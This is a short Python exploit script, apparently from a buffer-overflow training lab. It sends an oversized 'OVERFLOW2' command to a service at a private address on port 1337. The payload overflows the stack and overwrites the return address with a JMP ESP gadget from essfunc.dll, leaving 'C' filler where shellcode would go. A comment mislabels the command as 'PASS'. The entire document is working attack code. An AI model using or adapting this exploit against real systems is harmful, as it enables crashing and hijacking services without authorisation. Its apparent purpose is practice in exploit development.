import socket
import sys
import time


print("[+] Initiating the Crash Now!\n")

buff = "A" * 634

eip = "\xbb\x11\x50\x62" #625011BB JMP ESP from essfunc.dll

fill = "C" * 402


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = buff + eip + fill

# Connect to the Application
s.connect(('10.10.54.232', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command PASS
s.send('OVERFLOW2 ' + payload + '\r\n')
s.close()
